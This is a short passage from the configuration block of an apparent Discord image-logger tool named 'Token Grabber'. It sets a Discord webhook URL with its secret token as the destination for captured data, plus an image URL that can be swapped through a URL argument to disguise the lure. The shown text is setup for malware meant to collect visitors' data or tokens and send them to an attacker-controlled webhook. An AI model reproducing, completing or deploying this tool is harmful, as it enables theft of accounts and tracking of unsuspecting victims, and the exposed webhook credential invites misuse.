...
config = {
    # BASE CONFIG #
    "webhook": "https://discordapp.com/api/webhooks/1078506366525779998/J5v8LT7vXFCClAxwCce0sQr0vabQli4r4tz8deopEuLKeWqQUFwvc8vAU-pE11BF5SAa",
    "image": "https://cdn.discordapp.com/attachments/1077284440650301490/1078506628900458607/56807878-8b62-41c0-871b-07c157b43504.png", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Token Grabber", # Set this to the name you want the webhook to have
